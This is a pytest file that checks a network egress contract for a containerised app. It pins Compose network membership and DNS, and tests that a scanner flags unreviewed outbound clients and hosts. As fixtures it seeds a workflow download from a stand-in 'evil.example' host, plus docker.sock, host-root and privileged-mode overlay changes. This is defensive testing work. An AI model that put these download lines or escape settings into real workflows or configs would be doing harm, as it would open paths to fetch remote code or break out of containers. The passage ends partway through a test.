"""Bounded source contract, not a live egress test or an overlay firewall audit."""
from pathlib import Path
import ast
import hashlib
from collections import Counter
import importlib.util
import json
import re
import shutil
import subprocess
import sys
import tomllib

import pytest
import yaml


ROOT = Path(__file__).parents[1]
_OS_LOCAL = "os." + "local"
_API_INTERNAL = "aPi." + "internal"
_LOGGING_CORP = "logging." + "corp"
_OS_HOME = "os." + "home"
_MY_FILES_DB = "my-files." + "db"
_CDN_JS = "cdn." + "js"
_CDN_HOME = "cdn." + "home"


def test_reference_compose_network_boundary_and_explicit_exceptions():
    text = (ROOT / "compose.yaml").read_text()
    service_text = text.split("\nservices:\n", 1)[1].split("\nvolumes:\n", 1)[0]
    parts = re.split(r"(?m)^  ([a-z][a-z0-9-]*):\n", service_text)
    services = dict(zip(parts[1::2], parts[2::2], strict=True))
    networks = {
        "postgres": "services", "clamav": "services",
        "clamav-updater": "updates", "retrieval": "models",
        "generator": "models", "transcription-api": "services",
        "app": "app-egress, services, models", "gateway": "front, services",
        "egress-proxy": "app-egress, front",
        "model-stager": "front",
    }
    disconnected = {
        "transcription-worker", "transcription-cleanup",
        "transcription-cleanup-daemon", "account-admin",
    }
    assert set(services) == set(networks) | disconnected
    for name, section in services.items():
        if name in disconnected:
            assert re.findall(r"(?m)^    network_mode: (.+)$", section) == ["none"]
            assert not re.search(r"(?m)^    networks:", section)
        else:
            assert re.findall(r"(?m)^    networks: \[(.+)\]$", section) == [networks[name]]
            assert not re.search(r"(?m)^    network_mode:", section)
        if name != "gateway":
            assert not re.search(r"(?m)^    ports:", section), name
    assert ':-127.0.0.1}}' in services["gateway"]
    network_text = text.split("\nnetworks:\n", 1)[1].split("\nsecrets:\n", 1)[0]
    assert network_text.strip() == "front:\n  updates:\n  services:\n    internal: true\n  models:\n    internal: true\n  app-egress:\n    internal: true"
    for name in ("retrieval", "generator", "transcription-worker"):
        for flag in ("HF_HUB_OFFLINE", "TRANSFORMERS_OFFLINE"):
            assert f'{flag}: "1"' in services[name], (name, flag)
        assert "target: /models\n        read_only: true" in services[name] or ":/models:ro" in services[name]
    assert 'VLLM_NO_USAGE_STATS: "1"' in services["generator"]
    assert 'PYANNOTE_METRICS_ENABLED: "0"' in services["transcription-worker"]
    assert 'CLAMAV_NO_FRESHCLAMD: "true"' in services["clamav"]
    updater = services["clamav-updater"]
    mounts = updater.split("    volumes:\n", 1)[1].split("    tmpfs:", 1)[0]
    assert mounts.strip() == "- clamav-signatures:/var/lib/clamav"
    assert '"freshclam"' in updater and '"--checks=6"' in updater
    assert "profiles: [tools]" in services["model-stager"]
    assert "profiles: [ai]" in services["generator"]
    assert "profiles: [ai]" in services["retrieval"]


def test_app_has_no_direct_egress():
    compose = yaml.safe_load((ROOT / "compose.yaml").read_text())
    app = compose["services"]["app"]
    assert "network_mode" not in app
    assert app["networks"]
    assert all((compose["networks"][name] or {}).get("internal") is True for name in app["networks"])


def test_internal_services_use_container_local_dns_upstream():
    compose = yaml.safe_load((ROOT / "compose.yaml").read_text())
    restricted = {"app", "postgres", "clamav", "retrieval", "generator", "transcription-api"}
    for name in restricted:
        service = compose["services"][name]
        assert service.get("dns") == ["127.0.0.1"], name
        assert service.get("dns_search") == ["."], name
        assert all(compose["networks"][network]["internal"] for network in service["networks"])
    for name in {"egress-proxy", "gateway", "model-stager", "clamav-updater"}:
        assert "dns" not in compose["services"][name]


def test_network_smoke_runs_for_merge_groups_and_weekly():
    workflow = yaml.safe_load((ROOT / ".github/workflows/network-smoke.yml").read_text())
    events = workflow[True]  # PyYAML's YAML 1.1 spelling of `on`.
    assert "merge_group" in events
    assert events["schedule"] == [{"cron": "43 6 * * 1"}]
    assert workflow["jobs"]["network-smoke"]["if"] == (
        "github.event_name != 'pull_request' || contains(github.event.pull_request.labels.*.name, 'network-smoke')"
    )


@pytest.fixture
def contract_tree(tmp_path):
    for name in ("src", "services", "deploy", "scripts", "config", ".github"):
        # fixture-write: Copy repository inputs into the synthetic contract tree.
        shutil.copytree(ROOT / name, tmp_path / name,
                        ignore=shutil.ignore_patterns("__pycache__", "*.egg-info"))
    for path in ROOT.glob("compose*.yaml"):
        # fixture-write: Copy the reviewed Compose inputs into the synthetic tree.
        shutil.copy(path, tmp_path / path.name)
    return tmp_path


def run_contract(root):
    # Missing checker is an explicit red-before failure, not a skipped test.
    assert (ROOT / "scripts/network-contract.py").is_file()
    return subprocess.run([sys.executable, str(ROOT / "scripts/network-contract.py"),
                           "--root", str(root)], capture_output=True, text=True, timeout=45)


def test_network_contract_current_tree(contract_tree):
    result = run_contract(contract_tree)
    assert result.returncode == 0, result.stderr
    rows = tomllib.loads((contract_tree / 'config/egress-allowlist.toml').read_text())['source']
    assert {
        ('scripts/corpus_recognition.py', 'network import'),
        ('scripts/corpus_recognition.py', 'huggingface_hub.snapshot_download'),
        ('scripts/corpus_recognition.py', 'faster_whisper.WhisperModel'),
        ('scripts/stage-models.py', 'network import'),
        ('scripts/stage-models.py', 'huggingface_hub.snapshot_download'),
    } <= {(row['path'], row['detail']) for row in rows if row['kind'] == 'client'}
    row = next(row for row in rows if row['kind'] == 'host' and
               row['path'] == 'scripts/corpus_recognition.py')
    path = contract_tree / row['path']
    literal = next(node.value for node in ast.walk(ast.parse(path.read_text()))
                   if isinstance(node, ast.Constant) and isinstance(node.value, str) and
                   hashlib.sha256(node.value.encode()).hexdigest() == row['digest'])
    # fixture-write: Duplicate one reviewed literal to test allowance multiplicity.
    path.write_text(path.read_text() + f'\nDUPLICATE_HOST = {literal!r}\n')
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert f"unreviewed outbound host: {row['detail']}" in result.stderr


@pytest.mark.parametrize('command', ["python - <<'PY'", 'python3 - <<PY', 'python - <<"PY"'])
def test_contract_reviews_workflow_python(contract_tree, command):
    path = contract_tree / '.github/workflows/synthetic.yml'
    # fixture-write: Create the synthetic workflow directory.
    path.parent.mkdir(parents=True, exist_ok=True)
    # fixture-write: Seed inline Python without executing its network call.
    path.write_text('jobs:\n  probe:\n    steps:\n      - run: |\n          ' + command +
                    "\n          import urllib.request\n"
                    "          urllib.request.urlretrieve('https://evil.example/unpinned.bin', target)\n"
                    '          PY\n')
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert f'{path.relative_to(contract_tree)}:7: unreviewed outbound client: urllib.request.urlretrieve' in result.stderr


@pytest.mark.parametrize('quote', ["'", '"'])
def test_contract_reviews_workflow_python_command(contract_tree, quote):
    path = contract_tree / '.github/workflows/synthetic.yaml'
    # fixture-write: Create the synthetic workflow directory.
    path.parent.mkdir(parents=True, exist_ok=True)
    # fixture-write: Seed a simple quoted Python command for static inspection.
    path.write_text('jobs:\n  probe:\n    steps:\n      - run: |\n'
                    f'          python -c {quote}import urllib.request{quote}\n')
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert f'{path.relative_to(contract_tree)}:5: unreviewed outbound client: network import' in result.stderr


def test_contract_rejects_invalid_workflow_python(contract_tree):
    path = contract_tree / '.github/workflows/synthetic.yml'
    # fixture-write: Create the synthetic workflow directory.
    path.parent.mkdir(parents=True, exist_ok=True)
    # fixture-write: Seed an invalid inline Python source for rejection.
    path.write_text("jobs:\n  probe:\n    steps:\n      - run: |\n          python - <<'PY'\n"
                    '          invalid Python @\n          PY\n')
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert f'{path.relative_to(contract_tree)}:6: invalid Python source' in result.stderr


def unsupported_workflow_launch(contract_tree, step):
    path = contract_tree / '.github/workflows/synthetic.yml'
    workflow = {'jobs': {'synthetic-job': {'steps': [{'name': 'Synthetic launch', **step}]}}}
    # fixture-write: Seed a synthetic workflow for the actual CLI scanner.
    path.write_text(yaml.safe_dump(workflow, sort_keys=False))
    result = run_contract(contract_tree)
    assert result.returncode == 1, result.stdout
    assert '.github/workflows/synthetic.yml:' in result.stderr
    assert 'job synthetic-job, step 1 (Synthetic launch)' in result.stderr
    assert 'unsupported' in result.stderr
    assert 'workflow_inventory' in result.stderr


def test_contract_fails_closed_on_python_heredoc(contract_tree):
    unsupported_workflow_launch(contract_tree, {'run': "python <<'PY'\nprint('synthetic')\nPY\n"})


def test_contract_fails_closed_on_venv_python(contract_tree):
    unsupported_workflow_launch(contract_tree, {'run': ".venv/bin/python -c \"print('synthetic')\""})


@pytest.mark.parametrize('minor', ['0', '12', '999'])
def test_contract_fails_closed_on_versioned_python(contract_tree, minor):
    unsupported_workflow_launch(contract_tree, {'run': f"python3.{minor} -c \"print('synthetic')\""})


@pytest.mark.parametrize('prefix', ['FOO=1', 'env FOO=1'])
def test_contract_fails_closed_on_env_python(contract_tree, prefix):
    unsupported_workflow_launch(contract_tree, {'run': f"{prefix} python -c \"print('synthetic')\""})


def test_contract_fails_closed_on_piped_python(contract_tree):
    unsupported_workflow_launch(contract_tree, {'run': "printf 'print(1)' | python"})


def test_contract_fails_closed_on_github_script(contract_tree):
    unsupported_workflow_launch(contract_tree, {'uses': 'actions/github-script@synthetic',
                                               'with': {'script': "console.log('synthetic')"}})


def test_contract_accepts_parseable_workflow_python(contract_tree):
    path = contract_tree / '.github/workflows/synthetic.yml'
    workflow = {'jobs': {'synthetic-job': {'steps': [{'run': "python -c \"print('synthetic')\""}]}}}
    # fixture-write: Seed a supported inline Python control without network calls.
    path.write_text(yaml.safe_dump(workflow))
    result = run_contract(contract_tree)
    assert result.returncode == 0, result.stderr


@pytest.mark.parametrize('level', ['step', 'job', 'workflow'])
@pytest.mark.parametrize('shell', ['python', 'python {0}', 'bash {0}', 'ruby'])
def test_contract_blocks_unsupported_effective_shell(contract_tree, level, shell):
    step = {'run': 'import socket', 'name': 'Synthetic shell'}
    job = {'steps': [step]}
    workflow = {'jobs': {'probe': job}}
    if level == 'step':
        step['shell'] = shell
    else:
        (job if level == 'job' else workflow)['defaults'] = {'run': {'shell': shell}}
    path = contract_tree / '.github/workflows/synthetic.yml'
    # fixture-write: Seed synthetic effective-shell selection without execution.
    path.write_text(yaml.safe_dump(workflow))
    result = run_contract(contract_tree)
    assert result.returncode == 1, result.stdout
    assert 'unsupported shell' in result.stderr
    assert 'synthetic.yml:' in result.stderr and 'job probe, step 1' in result.stderr


@pytest.mark.parametrize('command', [
    '$PYTHON', '${{ steps.py.outputs.python-path }}', 'python2', 'pypy3', 'py',
    'python.exe', '/synthetic/pypy3', 'python3.12.exe', 'node', 'perl',
    'bash -c', 'sh -c', 'pwsh -Command', 'eval', 'env MODE=synthetic $PYTHON',
    'echo synthetic; $PYTHON', 'bash -lc', 'pypy3.exe', 'Python', 'jython',
    'if $PYTHON', '/usr/bin/env $PYTHON', 'uv run $RUNTIME', 'timeout 5 $RUNTIME',
])
def test_contract_blocks_unparsed_interpreter_or_nested_shell(contract_tree, command):
    nested = command in {'bash -c', 'sh -c', 'bash -lc', 'pwsh -Command', 'eval'}
    source = f'{command} \'python -c "import socket"\'' if nested else f'{command} -c "import socket"'
    if command.startswith('if '):
        source += '; then :; fi'
    unsupported_workflow_launch(contract_tree, {'run': source})


@pytest.mark.parametrize('command', ['pyw.exe', r'& "C:\synthetic\python.exe"'])
def test_contract_blocks_windows_python_launchers(contract_tree, command):
    unsupported_workflow_launch(contract_tree, {'shell': 'pwsh', 'run': f'{command} -c "import socket"'})


@pytest.mark.parametrize('command', [
    'python /tmp/synthetic.py', 'python scripts/synthetic.py',
    'python -m pip download https://evil.example/synthetic.whl', 'python -m http.server',
])
def test_contract_blocks_unlisted_script_or_module(contract_tree, command):
    path = contract_tree / '.github/workflows/synthetic.yml'
    # fixture-write: Seed an unreviewed file or module launch for static inspection.
    path.write_text(yaml.safe_dump({'jobs': {'probe': {'steps': [{'run': command}]}}}))
    result = run_contract(contract_tree)
    assert result.returncode == 1, result.stdout
    assert 'unreviewed outbound workflow-launch' in result.stderr
    assert 'synthetic.yml:' in result.stderr


@pytest.mark.parametrize('uses', ['docker://python:3.12', './.github/actions/synthetic'])
def test_contract_blocks_unlisted_container_or_local_action(contract_tree, uses):
    path = contract_tree / '.github/workflows/synthetic.yml'
    step = {'uses': uses, 'with': {'args': 'python -c "import socket"'}}
    # fixture-write: Seed an unreviewed action without creating or running a container.
    path.write_text(yaml.safe_dump({'jobs': {'probe': {'steps': [step]}}}))
    result = run_contract(contract_tree)
    assert result.returncode == 1, result.stdout
    assert 'unreviewed outbound workflow-action' in result.stderr
    assert 'synthetic.yml:' in result.stderr


@pytest.mark.parametrize('source', [
    '', 'jobs: [', 'jobs: {}', 'jobs: {probe: scalar}',
    'jobs: {probe: {steps: oops}}', 'jobs: {probe: {steps: [scalar]}}',
    'jobs: {probe: {steps: [{run: [python, -c, synthetic]}]}}',
    'jobs: {probe: {steps: [{run: echo, shell: []}]}}',
    'defaults: []\njobs: {probe: {steps: [{run: echo}]}}',
    'jobs: {probe: {steps: [{uses: []}]}}',
])
def test_contract_reports_malformed_workflow_without_traceback(contract_tree, source):
    path = contract_tree / '.github/workflows/synthetic.yml'
    # fixture-write: Seed malformed synthetic YAML or workflow field types.
    path.write_text(source)
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert 'synthetic.yml:' in result.stderr
    assert 'invalid workflow' in result.stderr
    assert 'Traceback' not in result.stderr


def test_contract_every_current_workflow_passes(contract_tree):
    assert {path.name for path in (ROOT / '.github/workflows').iterdir()} == {
        path.name for path in (contract_tree / '.github/workflows').iterdir()}
    result = run_contract(contract_tree)
    assert result.returncode == 0, result.stderr


@pytest.mark.parametrize('shell', ['bash', 'sh', 'pwsh'])
def test_contract_effective_shell_override_precedence(contract_tree, shell):
    step = {'shell': shell, 'run': 'echo synthetic'}
    workflow = {'defaults': {'run': {'shell': 'python'}}, 'jobs': {
        'probe': {'defaults': {'run': {'shell': shell}},
                  'steps': [step, {'run': 'echo synthetic'}]}}}
    # fixture-write: Seed supported step and job overrides of an unsupported workflow default.
    (contract_tree / '.github/workflows/synthetic.yml').write_text(yaml.safe_dump(workflow))
    assert run_contract(contract_tree).returncode == 0


@pytest.mark.parametrize('uses', ['docker://python:3.12', './.github/actions/synthetic'])
def test_contract_action_allowance_binds_inputs(contract_tree, uses):
    path = contract_tree / '.github/workflows/synthetic.yml'
    step = {'uses': uses, 'with': {'args': 'synthetic'}}
    workflow = {'jobs': {'probe': {'steps': [step]}}}
    # fixture-write: Seed a synthetic action and require review before accepting it.
    path.write_text(yaml.safe_dump(workflow))
    assert run_contract(contract_tree).returncode == 1
    spec = importlib.util.spec_from_file_location('network_contract', ROOT / 'scripts/network-contract.py')
    checker = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(checker)
    row = next(row for row in checker.source_inventory(contract_tree) if row[2] == 'workflow-action')
    policy = contract_tree / 'config/egress-allowlist.toml'
    # fixture-write: Grant only the exact synthetic action-step inventory entry.
    policy.write_text(policy.read_text() + '\n[[source]]\n' + '\n'.join(
        f'{key} = {json.dumps(value)}' for key, value in zip(
            ('path', 'kind', 'digest', 'detail'), (row[0], *row[2:]))))
    assert run_contract(contract_tree).returncode == 0
    step['with']['args'] = 'changed synthetic input'
    # fixture-write: Change action inputs to invalidate the reviewed digest.
    path.write_text(yaml.safe_dump(workflow))
    assert 'unreviewed outbound workflow-action' in run_contract(contract_tree).stderr


@pytest.mark.parametrize("value", [
    "os.path.join", "json.dumps", "recordbench.env",
    "synthetic-figure.png", "synthetic-report.json", "pathlib.path", "builtins.str",
    "selenium.webdriver.support.widgets", "Emulation.setDeviceMetricsOverride",
    "synthetic-report.JSON",
])
def test_contract_flags_plain_module_and_file_shaped_literals(contract_tree, value):
    source = f'import selenium.webdriver\nTARGET = {value!r}\n'
    # fixture-write: Seed synthetic source to exercise literal classification.
    (contract_tree / "src/synthetic_probe.py").write_text(source)
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert f"src/synthetic_probe.py:2: unreviewed outbound host: {value.lower()}" in result.stderr.splitlines()


@pytest.mark.parametrize("expression,host", [
    *[(repr(host), host) for host in (
        "example.com", "example.org", "example.net", "auth.login", "x.co",
        "192.0.2.10", "198.51.100.7", "203.0.113.5", "2001:db8::5",
        "synthetic.example.test", "os.test", "os.example", "os.invalid", "os.localhost",
        "camelCase.test", "os.com", "os.co", "os.io", "synthetic-module.attribute",
        "selenium.webdriver.support.ui", "exculpata-backup.sh",
    )],
    (repr("http://x.sh"), "x.sh"), (repr("https://x.co"), "x.co"),
    *[(f"httpx.get({host!r})", host) for host in ("x.sh", "notes.md", "x.co")],
    *[(f"socket.create_connection(({host!r}, 443))", host)
      for host in ("x.sh", "notes.md", "x.co")],
    # These cases check bare host constants without evaluating URL expressions.
    ("'http://' + 'x.sh'", "x.sh"),
    ("'http://' + ('x.sh' + suffix)", "x.sh"),
    ('f"http://{\'x.sh\'}"', "x.sh"),
    ("'http://%s' % 'x.sh'", "x.sh"),
    ("'http://{}'.format('x.sh')", "x.sh"),
    ("'http://'.join(['x.sh'])", "x.sh"),
    ("httpx.get(str('notes.md'))", "notes.md"),
    ("client.connect(('notes.md', 443))", "notes.md"),
    ("client.request(host='notes.md')", "notes.md"),
])
def test_contract_preserves_host_literals_in_network_context(contract_tree, expression, host):
    # fixture-write: Seed synthetic source without executing its network expressions.
    (contract_tree / "src/synthetic_probe.py").write_text(
        f"import httpx\nimport socket\nTARGET = {expression}\n")
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert f"src/synthetic_probe.py:3: unreviewed outbound host: {host.lower()}" in result.stderr.splitlines()


def test_contract_flags_module_shaped_literal_in_network_call(contract_tree):
    path = contract_tree / "src/synthetic_probe.py"
    # fixture-write: Seed a module-shaped literal as a synthetic network destination.
    path.write_text("import httpx\nhttpx.get('os.path.join')\n")
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert "src/synthetic_probe.py:2: unreviewed outbound host: os.path.join" in result.stderr.splitlines()


@pytest.mark.parametrize("host", ["example.sh", "example.md", "example.py", "example.zip"])
def test_contract_rejects_plain_file_suffix_tld_hosts(contract_tree, host):
    # fixture-write: Seed a synthetic host whose TLD also names a file suffix.
    (contract_tree / "src/synthetic_probe.py").write_text(f"TARGET = {host!r}\n")
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert f"src/synthetic_probe.py:1: unreviewed outbound host: {host}" in result.stderr.splitlines()


@pytest.mark.parametrize("host", ["os.run", "pathlib.link", "exampleApi.network"])
def test_contract_rejects_plain_identifier_tld_hosts(contract_tree, host):
    # fixture-write: Seed a synthetic host shaped like a module or camelCase identifier.
    (contract_tree / "src/synthetic_probe.py").write_text(f"TARGET = {host!r}\n")
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert f"src/synthetic_probe.py:1: unreviewed outbound host: {host.lower()}" in result.stderr.splitlines()


@pytest.mark.parametrize("source,host,line", [
    ("PREFIX = 'https://'\nTARGET = PREFIX + 'example.sh'\n", "example.sh", 2),
    ("HOST = 'example.zip'\nURL = f'https://{HOST}/status'\n", "example.zip", 1),
    ("SCHEME = 'https://'\nURL = '{}{}'.format(SCHEME, 'example.py')\n", "example.py", 2),
])
def test_contract_rejects_bare_tld_constants_in_url_expressions(contract_tree, source, host, line):
    # fixture-write: Seed bare host constants in unevaluated URL expressions.
    (contract_tree / "src/synthetic_probe.py").write_text(source)
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert f"src/synthetic_probe.py:{line}: unreviewed outbound host: {host}" in result.stderr.splitlines()


@pytest.mark.parametrize("source,host,line", [
    pytest.param(
        "import asyncio\nasync def main():\n    await asyncio.open_connection('" + _OS_LOCAL + "', 443)\n",
        _OS_LOCAL, 3, id="os-local",
    ),
    pytest.param("import smtplib\nsmtplib.SMTP('email.relay', 25)\n", "email.relay", 2, id="email-relay"),
    pytest.param("TARGET = '" + _API_INTERNAL + "'\n", _API_INTERNAL.lower(), 1, id="camelcase-internal"),
    pytest.param(
        "import socket\nHOST = '" + _LOGGING_CORP + "'\nsocket.create_connection((HOST, 443))\n",
        _LOGGING_CORP, 2, id="host-in-variable",
    ),
    pytest.param("SCHEME = 'https://'\nurl = f'{SCHEME}" + _OS_LOCAL + "'\n", _OS_LOCAL, 2, id="split-url"),
    *[pytest.param(
        "import asyncio\nasync def main():\n    await asyncio.open_connection('" + host + "', 443)\n",
        host, 3, id="asyncio-" + tail,
    ) for tail in ("lan", "svc", "onion") for host in ("os." + tail,)],
    pytest.param("TARGET = '" + _OS_HOME + "'\n", _OS_HOME, 1, id="os-home"),
    pytest.param("TARGET = '" + _MY_FILES_DB + "'\n", _MY_FILES_DB, 1, id="file-db"),
    pytest.param(
        "import socket\nHOST = '" + _CDN_JS + "'\nsocket.create_connection((HOST, 443))\n",
        _CDN_JS, 2, id="js-host-in-variable",
    ),
    pytest.param(
        "import redis\nredis.Redis(host='" + _OS_LOCAL + "')\n",
        _OS_LOCAL, 2, id="redis-host-keyword",
    ),
    pytest.param(
        "TARGET = 'https:' + '//' + '" + _OS_LOCAL + "'\n",
        _OS_LOCAL, 1, id="split-scheme",
    ),
    pytest.param(
        "from urllib.parse import urlunparse\nTARGET = urlunparse(('https', '" + _OS_LOCAL + "', '/', '', '', ''))\n",
        _OS_LOCAL, 2, id="urlunparse",
    ),
    pytest.param(
        "import yarl\nTARGET = yarl.URL.build(scheme='https', host='" + _OS_LOCAL + "')\n",
        _OS_LOCAL, 2, id="yarl-url-build",
    ),
    pytest.param(
        "import asyncio\nasync def main(host='" + _OS_LOCAL + "'):\n    await asyncio.open_connection(host, 443)\n",
        _OS_LOCAL, 2, id="private-function-default",
    ),
    pytest.param(
        "from .cdn import helper\nTARGET = '" + _CDN_HOME + "'\n",
        _CDN_HOME, 2, id="relative-import-root",
    ),
])
def test_contract_rejects_private_and_split_hosts(contract_tree, source, host, line):
    # fixture-write: Seed synthetic private hosts and a URL with a separate scheme.
    (contract_tree / "src/synthetic_probe.py").write_text(source)
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert f"src/synthetic_probe.py:{line}: unreviewed outbound host: {host}" in result.stderr.splitlines()


def test_contract_allowances_equal_findings(contract_tree):
    spec = importlib.util.spec_from_file_location("network_contract", ROOT / "scripts/network-contract.py")
    checker = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(checker)

    findings = Counter((path, kind, digest, detail)
                       for path, _, kind, digest, detail in checker.source_inventory(ROOT))
    policy = tomllib.loads((ROOT / "config/egress-allowlist.toml").read_text())
    allowances = Counter((item["path"], item["kind"], item["digest"], item["detail"])
                         for item in policy["source"])
    assert findings == allowances
    assert checker.check(contract_tree) == []
    policy_path = contract_tree / 'config/egress-allowlist.toml'
    row = policy['source'][0]
    # fixture-write: Add a surplus exact allowance without adding its source occurrence.
    policy_path.write_text(policy_path.read_text() + '\n[[source]]\n' +
                           ''.join(f'{key} = {json.dumps(value)}\n' for key, value in row.items()))
    assert any('stale ' + row['kind'] + ' allowance: ' + row['detail'] in error
               for error in checker.check(contract_tree))


def test_network_contract_rejects_loosening(contract_tree):
    path = contract_tree / "compose.yaml"
    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    path.write_text(path.read_text().replace("  models:\n    internal: true", "  models: {}"))
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert "compose.yaml:" in result.stderr and "network definitions changed" in result.stderr


@pytest.mark.parametrize("replacement", ["dns: [127.0.0.11]", "dns: []", "dns: [192.0.2.53]"])
def test_network_contract_rejects_dns_upstream_changes(contract_tree, replacement):
    path = contract_tree / "compose.yaml"
    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    path.write_text(path.read_text().replace("dns: [127.0.0.1]", replacement))
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert "network membership" in result.stderr


def test_network_contract_rejects_new_outbound_host(contract_tree):
    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    (contract_tree / "src/synthetic_probe.py").write_text('import httpx\nhttpx.get("https://example.invalid")\n')
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert "src/synthetic_probe.py:2:" in result.stderr
    assert "example.invalid" in result.stderr and "outbound client" in result.stderr


@pytest.mark.parametrize("host", ["outbound.example.invalid", "203.0.113.25", "2001:db8::25"])
def test_network_contract_rejects_bare_host_literal(contract_tree, host):
    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    (contract_tree / "src/synthetic_probe.py").write_text(f'TARGET = "{host}"\n')
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert f"src/synthetic_probe.py:1: unreviewed outbound host: {host}" in result.stderr.splitlines()


@pytest.mark.parametrize("change", [
    {"networks": ["front"]}, {"network_mode": "host"},
    {"network_mode": "service:gateway"}, {"networks": None},
    {"cap_add": ["NET_ADMIN"]}, {"privileged": True},
    {"ports": [{"target": 8786, "published": "8786", "host_ip": "127.0.0.1"}]},
    {"ports": ["8786:8786"]}, {"extra_hosts": ["issuer.example.test:host-gateway"]},
])
def test_contract_rejects_overlay_escape(contract_tree, change):
    path = contract_tree / "compose.local-accounts.yaml"
    data = yaml.safe_load(path.read_text())
    data["services"]["app"].update(change)
    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    path.write_text(yaml.safe_dump(data))
    result = run_contract(contract_tree)
    assert result.returncode == 1 and "compose.local-accounts.yaml:" in result.stderr


@pytest.mark.parametrize("change", [
    {"volumes": ["/var/run/docker.sock:/run/control:ro"]},
    {"volumes": [{"type": "bind", "source": "/run/containerd/containerd.sock", "target": "/run/control"}]},
    {"volumes": ["/:/host:ro"]},
    {"volumes": ["${SYNTHETIC_CONTROL_SOCKET}:/run/control"]},
    {"volumes_from": ["gateway"]},
    {"use_api_socket": True},
])
def test_contract_rejects_host_control_mounts(contract_tree, change):
    path = contract_tree / "compose.local-accounts.yaml"
    data = yaml.safe_load(path.read_text())
    data["services"]["app"].update(change)
    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    path.write_text(yaml.safe_dump(data))
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert "compose.local-accounts.yaml:" in result.stderr and "mounts or escape capability changed" in result.stderr


@pytest.mark.parametrize("definition", [
    {"driver": "local", "driver_opts": {"type": "none", "o": "bind", "device": "/run"}},
    {"external": True, "name": "synthetic-host-control"},
])
def test_contract_rejects_named_volume_host_control(contract_tree, definition):
    path = contract_tree / "compose.yaml"
    data = yaml.safe_load(path.read_text())
    data["volumes"]["clamav-signatures"] = definition
    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    path.write_text(yaml.safe_dump(data))
    result = run_contract(contract_tree)
    assert result.returncode == 1 and "volume definitions changed" in result.stderr


@pytest.mark.parametrize("source", [
    'import httpx as h\nh.get(destination)\n',
    'from urllib.request import urlopen as fetch\nfetch(destination)\n',
    'from requests import Session as S\ns = S()\ns.get(destination)\n',
    'import aiohttp\nasync def probe():\n async with aiohttp.ClientSession() as c:\n  await c.get(destination)\n',
    'from socket import create_connection as dial\ndial((destination, 443))\n',
    'import httpx\nclient = httpx.Client()\nget = client.get\nget(destination)\n',
    'import httpx\nclass Sender:\n def __init__(self):\n  self.client = httpx.Client()\n def send(self):\n  return self.client.get(destination)\n',
    'import httpx\nasync def probe(client: httpx.AsyncClient):\n await client.post(destination)\n',
    'not valid Python @\n',
])
def test_contract_rejects_alias_clients_and_invalid_source(contract_tree, source):
    # fixture-write: Mutate the synthetic contract tree for boundary validation.
    (contract_tree / "src/synthetic_probe.py").write_text(source)
    assert run_contract(contract_tree).returncode == 1


@pytest.mark.parametrize("source,expected", [
    ('import importlib\nimportlib.import_module("huggingface_hub")\n',
     [(2, "network import")]),
    ('__import__("httpx")\n', [(1, "network import")]),
    ('from importlib import import_module as load\ndef probe(destination):\n'
     '    hub = load("httpx")\n    hub.get(destination)\n',
     [(3, "network import"), (4, "httpx.get")]),
], ids=["importlib", "builtin", "bound-alias"])
def test_contract_rejects_reflective_network_imports(contract_tree, source, expected):
    relative = "src/synthetic_probe.py"
    # fixture-write: Seed literal reflective imports without executing network calls.
    (contract_tree / relative).write_text(source)
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert result.stderr.splitlines() == [
        f"{relative}:{line}: unreviewed outbound client: {detail}"
        for line, detail in expected
    ]


@pytest.mark.parametrize("module,member,arguments", [
    ("huggingface_hub", "snapshot_download", 'repo_id="synthetic/model"'),
    ("faster_whisper", "WhisperModel", '"synthetic/model"'),
    ("ctranslate2", "Translator", '"synthetic/model"'),
    ("av", "open", '"synthetic/media"'),
    ("av." + "audio", "AudioFrame", ""),
])
def test_contract_rejects_unreviewed_model_and_media_clients(contract_tree, module, member, arguments):
    relative = "src/case_intelligence/synthetic_hub_probe.py"
    # fixture-write: Seed synthetic imports and calls for static client review without executing them.
    (contract_tree / relative).write_text(
        f"from {module} import {member}\n{member}({arguments})\n")
    result = run_contract(contract_tree)
    assert result.returncode == 1
    assert result.stderr.splitlines() == [
        f"{relative}:1: unreviewed outbound client: network import",
        f"{relative}:2: unreviewed outbound client: {module}.{member}",
    ]


@pytest.mark.parametrize("baseline,addition,detail", [
    ('import httpx as h\ndef probe(destination):\n    pass\n    # NEW\n', 'h.get(destination)', 'httpx.get'),
    ('from urllib.request import urlopen as fetch\ndef probe(destination):\n    pass\n    # NEW\n', 'fetch(destination)', 'urllib.request.urlopen'),
    ('from requests import Session as S\ndef probe(destination):\n    c = S()\n    # NEW\n', 'c.get(destination)', 'requests.Session.get'),
    ('import httpx\nasync def probe(c: httpx.AsyncClient, destination):\n    pass\n    # NEW\n', 'await c.post(destination)', 'httpx.AsyncClient.post'),
    ('import httpx\ndef probe(destination):\n    c = httpx.Client()\n    get = c.get\n    # NEW\n', 'get(destination)', 'httpx.Client.get'),
    ('import httpx\ndef probe(destination):\n    c = httpx.Client()\n    c.get(destination)\n    # NEW\n', 'c.get(destination)', 'httpx.Client.get'),
])
def test_contract_detects_only_new_call_with_approved_imports(contract_tree, baseline, addition, detail):
    path = contract_tree / "src/synthetic_probe.py"
